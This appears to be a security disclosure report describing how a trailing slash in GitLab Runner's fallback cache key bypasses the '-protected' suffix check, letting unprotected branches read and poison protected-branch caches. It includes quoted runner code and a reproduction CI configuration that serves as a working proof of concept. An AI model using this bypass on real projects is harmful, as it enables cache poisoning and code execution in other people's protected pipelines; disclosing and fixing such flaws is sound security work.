## Report

#####  Summary

GitLab allows setting a fallback cache key that will be used in case the cache with a predefined key is not found, see https://docs.gitlab.com/ee/ci/caching/#use-a-fallback-cache-key For the fallback cache keys the suffixes `-protected` and `-non_protected` are not added and the keys are used as is. However, GitLan Runner validates that a fallback cache key does not contain `-protected` prefix to avoid abusing it for reading/writing data from the cache of a protected branch:

```go  
// https://gitlab.com/gitlab-org/gitlab-runner/-/blob/146e799742a9b5999ade14e9e84331018e074fac/shells/abstract.go#L144

	if strings.HasSuffix(cacheFallbackKey, "-protected") {  
		// The `-protected` suffix is reserved for protected refs, so we disallow it from user-specified values.  
		cacheFallbackKey = ""  
	}  
```

In other words, if a fallback cache key contains the `-protected` suffix, it will not be used for cache checking. Let's consider how cache keys are used to access the cache.

```go  
// https://gitlab.com/gitlab-org/gitlab-runner/-/blob/146e799742a9b5999ade14e9e84331018e074fac/shells/abstract.go#L137

func (b *AbstractShell) extractCacheOrFallbackCacheWrapper(  
	w ShellWriter,  
	info common.ShellScriptInfo,  
	cacheFile string,  
	cacheKey string,  
) {  
	cacheFallbackKey := info.Build.GetAllVariables().Value("CACHE_FALLBACK_KEY")  
	if strings.HasSuffix(cacheFallbackKey, "-protected") {  
		// The `-protected` suffix is reserved for protected refs, so we disallow it from user-specified values.  
		cacheFallbackKey = ""  
	}

	// Execute cache-extractor command. Failure is not fatal.  
	b.guardRunnerCommand(w, info.RunnerCommand, "Extracting cache", func() {  
		b.addExtractCacheCommand(w, info, cacheFile, cacheKey, cacheFallbackKey)  
	})  
}

func (b *AbstractShell) addExtractCacheCommand(  
	w ShellWriter,  
	info common.ShellScriptInfo,  
	cacheFile string,  
	cacheKey string,  
	cacheFallbackKey string,  
) {  
	args := []string{  
		"cache-extractor",  
		"--file", cacheFile,  
		"--timeout", strconv.Itoa(info.Build.GetCacheRequestTimeout()),  
	}

	if url := cache.GetCacheDownloadURL(info.Build, cacheKey); url != nil {  
		args = append(args, "--url", url.String())  
	}

	w.Noticef("Checking cache for %s...", cacheKey)  
	w.IfCmdWithOutput(info.RunnerCommand, args...)  
	w.Noticef("Successfully extracted cache")  
	w.Else()  
	w.Warningf("Failed to extract cache")  
	if cacheFallbackKey != "" {  
		b.addExtractCacheCommand(w, info, cacheFile, cacheFallbackKey, "")  
	}  
	w.EndIf()  
}
```

As can be seen, cache keys are used by `cache.GetCacheDownloadURL` that crafts a cache download URL and the crafted URL is passed as an argument to the `cache-extractor` command. `cache.GetCacheDownloadURL` does not perform any additional checks and simply concatenates several parameters in the URL depending on which adapter is used (in case of GitLab.com is S3).

Since the crafted URL is passed to the `--url` parameter, we can use `/` at the end of the fallback cache key to bypass the validation and craft a valid object name that will be combined with other parameters into a valid URL. In other words, if there is the `main-protected` cache key, the cache path will be:

```  
namespace/project/1337/main-protected  
```

and for the fallback cache key `main-protected/` the cache path will be:

```  
namespace/project/1337/main-protected/  
```

As a result, the fallback cache key can be used to access the cache of protected branches from non-protected ones.

#####  Steps to reproduce

1. Create a project  
1. Add `.gitlab-ci.yml` file with the following content:

```yaml  
my-job:  
  script:  
    - echo Currently in $CI_COMMIT_REF_SLUG  
    - test -f cached_file.txt && cat cached_file.txt  
    - test -f cached_file.txt || echo "This is from $CI_COMMIT_REF_SLUG" > cached_file.txt  
  cache:  
    key: "$CI_COMMIT_REF_SLUG"  
    paths:  
      - cached_file.txt  
```

1. Wait for the job to compete.  
1. Create a new branch.  
1. Update `.gitlab-ci.yml` with the following content:

```yaml  
variables:  
  CACHE_FALLBACK_KEY: "$CI_DEFAULT_BRANCH-protected/"

my-job:  
  script:  
    - echo Currently in $CI_COMMIT_REF_SLUG  
    - test -f cached_file.txt && cat cached_file.txt  
    - test -f cached_file.txt || echo "This is from $CI_COMMIT_REF_SLUG" > cached_file.txt  
  cache:  
    key: "$CI_COMMIT_REF_SLUG-hop"  
    paths:  
      - cached_file.txt  
```

1. Wait for the job to complete.  
1. Check out the job logs; the cache for the `main` branch was downloaded.

#####  Impact

This vulnerability allows an attacker to gain read/write permissions for the cache of protected branches. It can be used to poison the cache and execute arbitrary commands/code in the context of protected branches. Since pipelines can be triggered in parent projects from forks https://docs.gitlab.com/ee/ci/pipelines/merge_request_pipelines.html#run-pipelines-in-the-parent-project an attacker can poison the cache with minimum permissions.

#####  What is the current *bug* behavior?

Cache keys are placed directly to a cache URL.

#####  What is the expected *correct* behavior?

Cache keys are encoded before being placed in a cache URL.
